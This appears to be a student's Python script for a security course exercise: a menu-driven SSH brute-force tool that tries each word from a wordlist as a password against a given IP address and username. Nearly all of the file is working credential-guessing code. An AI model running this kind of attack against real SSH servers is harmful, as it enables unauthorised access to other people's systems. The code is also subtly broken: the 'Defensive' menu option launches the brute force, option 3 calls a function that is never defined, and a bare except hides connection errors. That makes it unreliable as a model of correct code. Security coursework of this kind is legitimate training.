#!/usr/bin/env python3

# Script: Ops 401 Class 17 Ops Challenge
# Author: Spencer Mitchell
# Date of latest revision: 5/9/23
# Purpose: Add to your Python brute force tool the capability to:
#       Authenticate to an SSH server by its IP address.
#       Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.
# Resources: In class demo, class repo, and chatgpt. 





import time
import getpass
import paramiko

# Define functions
def iterator():
    filepath = input("Enter your dictionary filepath: ")
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            word = line.strip()
            print(word)
            time.sleep(1)

def check_password():
    username = input("Enter the username: ")
    ip_address = input("Enter the IP address: ")
    filepath = input("Enter your dictionary filepath: ")
    with open(filepath, encoding="ISO-8859-1") as file:
        for line in file:
            password = line.strip()
            print(f"Trying password: {password}")
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip_address, username=username, password=password, timeout=5)
                print("Login successful!")
                return
            except:
                pass
    print("Password not found.")

# Main
while True:
    mode = input("""
    Brute Force Wordlist Attack Tool Menu
    1 - Offensive, Dictionary Iterator
    2 - Defensive, Password Recognized
    3 - SSH Authentication
    4 - Exit
    Please enter a number: 
    """)
    if mode == "1":
        iterator()
    elif mode == "2":
        check_password()
    elif mode == "3":
        ssh_authentication()
    elif mode == "4":
        break
    else:
        print("Invalid selection.")
